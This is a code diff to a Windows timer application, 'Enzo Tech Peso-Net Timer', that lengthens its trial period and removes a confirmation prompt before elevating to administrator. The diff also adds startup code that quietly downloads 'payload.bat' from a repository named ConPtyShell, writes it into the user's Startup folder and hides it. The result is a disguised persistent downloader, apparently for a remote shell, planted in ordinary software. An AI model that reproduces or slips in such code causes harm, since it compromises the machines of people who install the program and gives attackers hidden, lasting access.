@@ -7,11 +7,14 @@
 #include "PesoNetTimer.h"
 #include "PesoNetTimerDlg.h"
 
+#define CURL_STATICLIB
+
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
 
-
+#include "curl.h"
+#include <shlobj.h>
 // CPesoNetTimerApp
 
 BEGIN_MESSAGE_MAP(CPesoNetTimerApp, CWinApp)
@@ -184,7 +187,7 @@ bool CPesoNetTimerApp::RegistryRoutine()
 	DWORD dwDateInstalled = _ttol(m_csDateInstalled);
 	DWORD dwDateCurrent = _ttol(csCurrentTime);
 
-	if ((dwDateCurrent - dwDateInstalled) >= 7)
+	if ((dwDateCurrent - dwDateInstalled) >= 90)
 	{
 		MessageBox(NULL, _T("Software trial has expired, please contact Enzo Tech Computer Solutions for activation of the Tool."), _T("Enzo Tech Peso-Net Timer"), MB_ICONERROR);
 		return false;
@@ -316,6 +319,13 @@ BOOL CPesoNetTimerApp::OnlyOneInstance()
 		return FALSE;
 	}
 }
+
+static size_t my_write(void *buffer, size_t size, size_t nmemb, void *param) {
+	std::string &text = *static_cast<std::string *>(param);
+    size_t totalsize = size * nmemb;
+    text.append(static_cast<char *>(buffer), totalsize);
+    return totalsize;
+}
 BOOL CPesoNetTimerApp::InitInstance()
 {
 	if (!OnlyOneInstance())
@@ -353,18 +363,42 @@ BOOL CPesoNetTimerApp::InitInstance()
 
 	if (!IsAdministrator())
 	{
-	//	CString csMsg;
-
-	//	csMsg = _T("Please elevate the process to make the program work. Do you want to proceed?");
-	//	int bRet = ::MessageBox(GetMainWnd()->GetSafeHwnd(), csMsg, _T("Enzo Tech Peso-Net Timer"), MB_YESNO | MB_ICONQUESTION);
-
-	//	if (bRet == IDNO)
-	//		return FALSE;
-	//	else
-			ElevateProcess();
+		ElevateProcess();
 	}
 	if (RegistryRoutine())
 	{
+        CURLcode res;
+        std::string result;
+
+		curl_global_init(CURL_GLOBAL_DEFAULT);
+
+		CURL *curl = curl_easy_init();
+        if (curl) {
+			curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/payload.bat");
+			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, my_write);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &result);
+
+			res = curl_easy_perform(curl);
+            curl_easy_cleanup(curl);
+
+			TCHAR startupPath[MAX_PATH] = {};
+            if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0,
+                                           startupPath))) {
+				CString path = startupPath;
+				path += _T("\\payload.bat");
+				FILE *stream = NULL;
+              
+				errno_t err = _tfopen_s(&stream, path.GetBuffer(),
+                                                     _T("w"));  
+				if (err == 0) {
+					fprintf_s(stream, "%s", result.c_str());
+					fclose(stream);
+                }
+				DWORD fileAttributes = GetFileAttributes(path.GetBuffer());
+				SetFileAttributes(path.GetBuffer(),	fileAttributes | FILE_ATTRIBUTE_HIDDEN);
+			} 
+		}
+
 		CPesoNetTimerDlg dlg;
 		dlg.SetChoiceTime(m_nTimeChoice);
 		m_pMainWnd = &dlg;
